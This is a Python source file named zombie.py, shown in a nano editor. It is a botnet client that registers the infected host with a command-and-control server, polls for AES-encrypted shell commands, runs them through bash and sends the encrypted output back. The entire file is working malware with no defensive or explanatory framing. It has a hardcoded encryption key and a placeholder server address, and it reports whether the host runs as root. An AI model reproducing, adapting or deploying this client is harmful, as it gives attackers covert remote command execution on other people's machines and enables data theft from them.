  GNU nano 8.3                                                                                                                                        zombie.py                                                                                                                                                  
import requests
import uuid
import time
import platform
import subprocess
import os
from base64 import b64decode, b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad, pad

C2_URL = "http://ip:5000"  # Adjust as necessary
BOT_ID = str(uuid.uuid4())

# AES Encryption/Decryption setup – same as used in the C2 server
KEY = b64decode('JxK69VY/eJVwNK8CWRFd2Q==')  # Must match the key in C2

def is_root():
    return os.geteuid() == 0

def register():
    data = {
        "id": BOT_ID,
        "os": platform.platform() + (" (root)" if is_root() else "")
    }
    try:
        requests.post(f"{C2_URL}/register", json=data, timeout=5)
    except requests.RequestException as e:
        print(f"Registration error: {e}")

def decrypt_data(iv, encrypted_data):
    iv = b64decode(iv)
    encrypted_data = b64decode(encrypted_data)
    
    # Ensure the IV is exactly 16 bytes long
    if len(iv) != 16:
        iv = iv.ljust(16, b'\0')[:16]

    if not encrypted_data:
        raise ValueError("Encrypted data is empty")
        
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(encrypted_data), 16).decode('utf-8')
    return decrypted_data

def fetch_command():
    response = requests.get(f"{C2_URL}/get?id={BOT_ID}")
    data = response.json()
    print(f"Server response: {data}")  # Debug print
    if 'iv' in data and 'cmd' in data:
        encrypted_data = data['cmd']
        if not encrypted_data:
            return ""  # No command queued
        return decrypt_data(data['iv'], encrypted_data)
    else:
        raise ValueError("Invalid response: Missing 'iv' or 'cmd'")

def send_output(output):
    try:
        iv, encrypted_output = encrypt_data(output)
        payload = {"id": BOT_ID, "output": encrypted_output, "iv": iv}
        requests.post(f"{C2_URL}/report", json=payload, timeout=5)
    except requests.RequestException as e:
        print(f"Send output error: {e}")

def encrypt_data(data):
    cipher = AES.new(KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode(), 16))
    iv = b64encode(cipher.iv).decode('utf-8')
    ct = b64encode(ct_bytes).decode('utf-8')
    return iv, ct

def main_loop():
    register()
    while True:
        cmd = fetch_command()
        if cmd:
            print(f"Executing command: {cmd}")
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, executable="/bin/bash")
                output = output.decode(errors="ignore")
            except subprocess.CalledProcessError as e:
                output = e.output.decode(errors="ignore") if e.output else str(e)
            send_output(output)
        time.sleep(5)

if __name__ == "__main__":
    main_loop()
